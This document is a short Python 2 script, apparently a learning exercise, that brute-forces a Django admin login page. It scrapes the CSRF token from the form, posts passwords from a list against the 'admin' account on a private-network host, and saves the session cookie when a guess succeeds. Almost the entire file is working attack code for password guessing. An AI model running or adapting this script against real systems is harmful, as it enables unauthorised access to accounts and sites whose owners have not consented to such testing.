#!/usr/bin/python
#coding=utf-8
#filename:learn_py.py

import urllib, urllib2, cookielib, time
from os import path
class auth_cookie():
    def __init__(self,
                 user_agent="Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)",
                 cookie_file="/tmp/cookie_test.txt"):
        #self.client_headers = {'User-Agent': user_agent}
        self.client_headers = ('User-Agent', user_agent)
        self.opener = urllib2.build_opener()
        urllib2.install_opener(self.opener)
        self.opener.addheaders = [self.client_headers]
        self.ckjar = cookielib.MozillaCookieJar(cookie_file)
        self.ckprc = urllib2.HTTPCookieProcessor(self.ckjar)
        self.opener.add_handler(self.ckprc)

    def pre_read(self,
                 url="http://192.168.192.214:8000/admin/"):
        #在GET/POST访问登录界面时，会生成CSRF TOKEN信息，在提交时的FORM中需要对应信息
        try:
            response = urllib2.urlopen(url)
        except urllib2.HTTPError, e:
            print "urllib2.urlopen() raise ERROR(", e, ")"
            return
        self.response = response.read()
        index = self.response.find("csrfmiddlewaretoken")
        csrf = self.response[index:index+60]
        print csrf
        self.csrfM = csrf.split("'")[2]
        return

    def crack(self,
              username="admin",
              url="http://192.168.192.214:8000/admin/",
              csrfM=None,
              pwd=None):
        if not csrfM:
            if not self.csrfM:
                return "error"
            csrfM = self.csrfM
        for key1 in pwd:
            print key1
            pwd_encode = urllib.urlencode({
                    'username': username,
                    'password': key1,
                    'this_is_the_login_form': 1,
                    'next': '/admin/',
                    'csrfmiddlewaretoken': csrfM,
                    })
            try:
                req = urllib2.Request(url)
                response = self.opener.open(req, pwd_encode)
            except urllib2.HTTPError, e:
                print "opener.open() raise ERROR(", e, ")"
                return
            response_resu = response.getcode()
            if response_resu == 200:
                response_html = response.read()
                #怎么样判断是通过验证，标志是***用户登陆失败***
                case = response_html.find('Please enter the correct')
                if case != -1:
                    print "false.....", key1
                else:
                    print time.ctime(), " Find The Key: ", key1
                    self.ckjar.save()
                    return key1
        return

    def print_class(self):
        print self.client_headers
        print self.ckjar.filename

if __name__ == "__main__":
    s11 = auth_cookie()
    #s11.print_class()
    s11.pre_read()
    pwd = ['dmin', 'aaa', 'admin']
    print s11.crack(pwd=pwd)
    print s11.csrfM
